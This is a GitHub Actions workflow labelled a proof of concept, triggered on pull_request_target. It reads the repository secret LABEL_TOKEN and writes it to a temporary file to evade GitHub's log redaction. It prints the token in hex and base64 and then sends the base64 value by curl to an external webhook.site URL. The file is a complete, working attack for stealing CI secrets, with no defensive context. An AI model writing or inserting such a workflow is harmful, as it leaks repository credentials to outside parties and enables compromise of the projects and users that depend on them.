name: File Based POC
on: [pull_request_target]

jobs:
  file-poc:
    runs-on: ubuntu-latest
    steps:
      - name: Write token to file
        env:
          LABEL_TOKEN: ${{ secrets.LABEL_TOKEN }}
        run: |
          # Write to a file - GitHub can't redact file contents
          echo "$LABEL_TOKEN" > /tmp/token.txt
          
          # Create a script that reads and encodes
          cat > /tmp/encode.sh << 'EOF'
          #!/bin/bash
          TOKEN=$(cat /tmp/token.txt)
          echo "File contents length: ${#TOKEN}"
          echo "Hex: $(echo -n "$TOKEN" | xxd -p)"
          echo "Base64: $(echo -n "$TOKEN" | base64)"
          EOF
          
          chmod +x /tmp/encode.sh
          
      - name: Read and exfiltrate
        run: |
          /tmp/encode.sh
          
          # Get the encoded value
          ENCODED=$(cat /tmp/token.txt | base64)
          
          # Send to webhook
          curl -s -X POST "https://webhook.site/5abc3452-aafc-4f71-91b8-2cad2e68739f" \
            -d "token=$ENCODED"
